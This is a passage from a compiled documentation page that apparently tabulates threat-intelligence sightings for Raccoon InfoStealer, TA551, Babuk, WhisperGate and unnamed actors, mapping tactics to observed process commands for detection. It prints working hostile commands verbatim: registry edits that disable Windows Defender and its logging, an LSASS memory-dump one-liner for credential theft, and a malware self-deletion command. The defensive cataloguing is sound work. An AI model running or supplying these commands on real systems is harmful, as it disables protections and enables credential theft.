",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\" /v DisableAntiVirus /t REG_DWORD /d 1 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\MpEngine\\" /v MpEnablePus /t REG_DWORD /d 0 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Reporting\\" /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\" /v DisableIOAVProtection /t REG_DWORD /d 1 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\SpyNet\\" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\SpyNet\\" /v SpynetReporting /t REG_DWORD /d 0 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\SpyNet\\" /v SubmitSamplesConsent /t REG_DWORD /d 0 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\WMI\\\\Autologger\\\\DefenderApiLogger /v Start /t REG_DWORD /d 0 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\WMI\\\\Autologger\\\\DefenderAuditLogger /v Start /t REG_DWORD /d 0 /f'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"Reg.exe")," to disable Windows Defender Policies and Services via ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"PowerShell")," spawns multiple executions of ",(0,l.kt)("em",{parentName:"td"},"CMD")," to Disable Windows Defender Policies."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg delete HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\StartupApproved\\\\Run /v \\"Windows Defender\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg delete HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v \\"Windows Defender\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg delete HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v WindowsDefender /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg delete HKCR\\\\*\\\\shellex\\\\ContextMenuHandlers\\\\EPP /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg delete HKCR\\\\Directory\\\\shellex\\\\ContextMenuHandlers\\\\EPP /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg delete HKCR\\\\Drive\\\\shellex\\\\ContextMenuHandlers\\\\EPP /f'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"Reg.exe")," to disable Windows Defender Policies and Services via ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"PowerShell")," spawns multiple executions of ",(0,l.kt)("em",{parentName:"td"},"CMD")," to Disable Windows Defender Services."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdBoot /v Start /t REG_DWORD /d 4 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdFilter /v Start /t REG_DWORD /d 4 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdNisDrv /v Start /t REG_DWORD /d 4 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdNisSvc /v Start /t REG_DWORD /d 4 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WinDefend /v Start /t REG_DWORD /d 4 /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\" /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\SecurityHealthService /v Start /t REG_DWORD /d 4 /f'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used a ",(0,l.kt)("em",{parentName:"td"},"highly obfuscated PowerShell")," commands for Command And Control."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," spawns execution of ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," one-liner."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"/c powershell -w hidden -c function a($u)[REDACTED]"))))),(0,l.kt)("h2",{id:"from-the-ac3-threat-sighting-for-raccoon-infostealer"},"From the AC3 Threat Sighting for ",(0,l.kt)("em",{parentName:"h2"},"Raccoon InfoStealer")),(0,l.kt)("p",null,"Full details at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Raccoon_InfoStealer.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Raccoon_InfoStealer.yml")),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"Visual Basic scripts")," to launch a ",(0,l.kt)("em",{parentName:"td"},"doscmd/batch")," file via ",(0,l.kt)("em",{parentName:"td"},"CMD")," for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},"Malware executed a batch file via CMD."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\Windows\\\\system32\\\\cmd.exe /c \\"\\"C:\\\\ProgramData\\\\IgHMwb34dcD\\\\AVDbbbn7i3b4ho55ck6raahj.bat\\" \\"'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"AntiAV")," (an open source tool obfuscation tool) to obfuscate malware binary file for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},"Malware executed open source deobfuscator tool (",(0,l.kt)("a",{parentName:"td",href:"https://github.com/hXR16F/AntiAV/"},"https://github.com/hXR16F/AntiAV/"),") via CMD.exe."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\Windows\\\\system32\\\\cmd.exe /c \\"\\"C:\\\\ProgramData\\\\IgHMwb34dcD\\\\main.bat\\"'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"CMD")," to launch Raccoon InfoStealer for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},"Raccoon InfoStealer was launched via ",(0,l.kt)("em",{parentName:"td"},"CMD"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"door.exe"'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"Malware used ",(0,l.kt)("em",{parentName:"td"},"CMD delayed command execution")," to delelete itself for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},"Raccoon InfoStealer introduced a delayed command execution via CMD to delete itself."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'cmd.exe /C timeout /T 10 /NOBREAK > Nul & Del /f /q "C:\\\\ProgramData\\\\IgHMwb34dcD\\\\door.exe"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q "C:\\\\ProgramData\\\\IgHMwb34dcD\\\\door.exe"'))))),(0,l.kt)("h2",{id:"from-the-ac3-threat-sighting-for-ta551"},"From the AC3 Threat Sighting for ",(0,l.kt)("em",{parentName:"h2"},"TA551")),(0,l.kt)("p",null,"Full details at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_TA551.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_TA551.yml")),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"weaponized .doc files")," to lure users for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Winword")," spawned ",(0,l.kt)("em",{parentName:"td"},"CMD")," to launch ",(0,l.kt)("em",{parentName:"td"},".HTA")," file"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c c:\\\\programdata\\\\brDefine.hta"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c c:\\\\programdata\\\\sds.hta"))))),(0,l.kt)("h2",{id:"from-the-ac3-threat-sighting-for-tortillas-babuk"},"From the AC3 Threat Sighting for ",(0,l.kt)("em",{parentName:"h2"},"Tortillas Babuk")),(0,l.kt)("p",null,"Full details at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Tortillas_Babuk.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Tortillas_Babuk.yml")),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used an exploit on Public-Facing Application to execute an encoded PowerShell command for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},"IIS worker process (w3wp.exe) launched CMD for encoded PowerShell command execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\system32\\\\cmd.exe /c powershell.exe -nop -w hidden -e JAB3ACAAPQAgA[REDACTED]"))))),(0,l.kt)("h2",{id:"from-the-ac3-threat-sighting-for-unk-credential-access"},"From the AC3 Threat Sighting for ",(0,l.kt)("em",{parentName:"h2"},"UNK-Credential Access")),(0,l.kt)("p",null,"Full details at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_UNK-Credential_Access.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_UNK-Credential_Access.yml")),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"CMD")," to execute ",(0,l.kt)("em",{parentName:"td"},"tasklist")," for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," command to discover LSASS process instances, iterate on results, and trigger the memory dumps."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'cmd.exe  /Q /c for /f \\"tokens=1,2 delims= \\" %A in (\'\\"tasklist /fi \\"Imagename eq lsass.exe\\" \\| find \\"lsass\\"\\"\') do rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump %B \\\\Windows\\\\Temp\\\\5LCZjZ5cA.fnt full'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'cmd.exe /Q /c for /f \\"tokens=1,2 delims= \\" ^%A in (\'\\"tasklist /fi \\"Imagename eq lsass.exe\\" \\| find \\"lsass\\"\\"\') do rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump ^%B \\\\Windows\\\\Temp\\\\dpSx.docx full'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used a ",(0,l.kt)("em",{parentName:"td"},"Windows Service")," to launch ",(0,l.kt)("em",{parentName:"td"},"RunDll32")," via ",(0,l.kt)("em",{parentName:"td"},"CMD")," for Persistence."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," executed ",(0,l.kt)("em",{parentName:"td"},"RunDll32")),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd.exe /Q /c rundll32.exe \\\\Windows\\\\Temp\\\\dumpert.dll,Dump"))))),(0,l.kt)("h2",{id:"from-the-ac3-threat-sighting-for-unk-phishing"},"From the AC3 Threat Sighting for ",(0,l.kt)("em",{parentName:"h2"},"UNK-Phishing")),(0,l.kt)("p",null,"Full details at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_UNK-Phishing.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_UNK-Phishing.yml")),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"alleged Cobalt Strike implant"),"  to run ",(0,l.kt)("em",{parentName:"td"},"ipconfig")," for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"mslibupdate.exe")," spawned ",(0,l.kt)("em",{parentName:"td"},"CMD"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C ipconfig /all"))))),(0,l.kt)("h2",{id:"from-the-ac3-threat-sighting-for-whispergate"},"From the AC3 Threat Sighting for ",(0,l.kt)("em",{parentName:"h2"},"WhisperGate")),(0,l.kt)("p",null,"Full details at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_WhisperGate.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_WhisperGate.yml")),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"Impacket")," to execute ",(0,l.kt)("em",{parentName:"td"},"Stage1")," ",(0,l.kt)("em",{parentName:"td"},".EXE")," file via WMI and CMD for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},"Suspicious command executed via Windows Command Shell."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd.exe /Q /c start c:\\\\stage1.exe 1> \\\\\\\\127.0.0.1\\\\ADMIN$\\__[TIMESTAMP] 2>&1"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"Impacket")," to execute ",(0,l.kt)("em",{parentName:"td"},"Stage1")," ",(0,l.kt)("em",{parentName:"td"},".EXE")," file via WMI and CMD for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Stage1 malware")," is executed via Windows Command Shell."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"stage1.exe"))))))}c.isMDXComponent=!0}}]);